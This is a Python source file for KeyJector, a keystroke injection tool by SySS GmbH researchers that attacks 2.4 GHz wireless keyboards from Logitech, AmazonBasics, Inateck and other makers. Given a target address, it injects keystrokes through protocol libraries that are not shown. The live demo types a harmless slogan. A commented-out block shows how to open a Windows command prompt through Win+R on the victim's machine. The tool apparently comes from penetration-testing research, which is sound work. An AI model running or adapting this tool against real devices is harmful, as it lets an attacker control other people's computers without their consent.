#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  KeyJector

  by Matthias Deeg (@matthiasdeeg, matthias.deeg@syss.de)

  based on tools by Marc Newlin (@marcnewlin)

  Keystroke injection tool for supported 2.4 GHz wireless input devices

  Copyright (C) 2019 Marc Newlin
  Copyright (C) 2019 Matthias Deeg, SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__version__ = '0.1'
__author__ = 'Matthias Deeg, Marc Newlin'


from lib import common
from protocols import *
from binascii import hexlify, unhexlify


def banner():
    """Show a fancy banner"""

    print(
""" _______ _______ _______ _______ _______ _______ _______ _______ _______\n"""
"""|\     /|\     /|\     /|\     /|\     /|\     /|\     /|\     /|\     /|\n"""
"""| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |\n"""
"""| |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | |\n"""
"""| |K  | | |e  | | |y  | | |J  | | |e  | | |c  | | |t  | | |o  | | |r  | |\n"""
"""| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |\n"""
"""|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|\n"""
"""KeyJector v{0} by Matthias Deeg - SySS GmbH\n"""
"""Based on different tools by Marc Newlin""".format(__version__))


# main program
if __name__ == '__main__':
    # show banner
    banner()

    # Parse command line arguments and initialize the radio
    common.init_args('./keyjector.py')
    common.parser.add_argument('-a', '--address', type=str, help='Target address')
    common.parser.add_argument('-f', '--family', required=True, type=Protocols, choices=list(Protocols), help='Protocol family')
    common.parse_and_init()

    # Parse the address
    address = ''
    if common.args.address is not None:
        address_string = common.args.address
        address = unhexlify(common.args.address.replace(':', ''))[::-1]

    # Initialize the target protocol
    if common.args.family == Protocols.HS304:
        p = HS304()
    elif common.args.family == Protocols.Canon:
        p = Canon()
    elif common.args.family == Protocols.TBBSC:
        if len(address) != 3:
            raise Exception('Invalid address: {0}'.format(common.args.address))
        p = TBBSC(address)
    elif common.args.family == Protocols.RII:
        if len(address) != 5:
            raise Exception('Invalid address: {0}'.format(common.args.address))
        p = RII(address)
    elif common.args.family == Protocols.AmazonBasics:
        if len(address) != 5:
            raise Exception('Invalid address: {0}'.format(common.args.address))
        p = AmazonBasics(address)
    elif common.args.family == Protocols.Logitech:
        if len(address) != 5:
            raise Exception('Invalid address: {0}'.format(common.args.address))
        p = Logitech(address)
    elif common.args.family == Protocols.LogitechEncrypted:
        if len(address) != 5:
            raise Exception('Invalid address: {0}'.format(common.args.address))
        p = Logitech(address, encrypted=True)
    elif common.args.family == Protocols.Inateck_WP1001:
        if len(address) != 3:
            raise Exception('Invalid address: {0}'.format(common.args.address))
        p = Inateck_WP1001(address)
    elif common.args.family == Protocols.Inateck_WP2002:
        if len(address) != 5:
            raise Exception('Invalid address: {0}'.format(common.args.address))
        p = Inateck_WP2002(address)

    # Initialize the key injector instance with a specific keyboard layout
    kj = Injector(p, injector.KEYMAP_GERMAN)

    # perform demo keystroke injection attack
    kj.start_injection()
    for c in range(10):
        kj.send_key(injector.KEY_NONE)
    kj.send_string("All your base are belong to SySS!")
    kj.send_enter()
    kj.stop_injection()

    # # demo keystroke injector for Windows systems
    # kj.start_injection()
    #
    # for c in range(10):
    #     kj.send_key(injector.KEY_NONE)
    #
    # # Windows + R
    # kj.send_key(injector.KEY_R, win=True)
    #
    # # busy sleep with packet transmissions
    # for c in range(10):
    #     kj.send_key(injector.KEY_NONE)
    # kj.send_string("cmd")
    #
    # # busy sleep with packet transmissions
    # for c in range(10):
    #     kj.send_key(injector.KEY_NONE)
    #
    # # send ENTER
    # kj.send_enter()
    #
    # # busy sleep with packet transmissions
    # for c in range(50):
    #     kj.send_key(injector.KEY_NONE)
    #
    # kj.send_string("All your base are belong to CONFidence Hackers!")
    # kj.stop_injection()
